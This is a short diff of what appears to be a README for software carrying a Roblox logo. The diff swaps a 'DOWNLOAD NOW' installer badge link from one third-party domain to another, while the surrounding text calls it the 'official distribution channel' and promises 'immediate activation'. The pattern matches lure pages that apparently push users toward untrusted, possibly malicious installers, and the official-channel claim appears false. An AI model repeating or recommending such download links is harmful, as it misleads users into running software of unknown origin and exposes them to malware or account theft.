@@ -8,7 +8,7 @@
 
 Acquire the software through the official distribution channel. Follow the straightforward procedure below for immediate activation.
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/Download-Installer-important?style=for-the-badge&logo=roblox)](https://fullsofts.org/)
+[![DOWNLOAD NOW](https://img.shields.io/badge/Download-Installer-important?style=for-the-badge&logo=roblox)](https://tj-kingdeecloud.com/)
 
 ### ⚙️ Installation Walkthrough
 
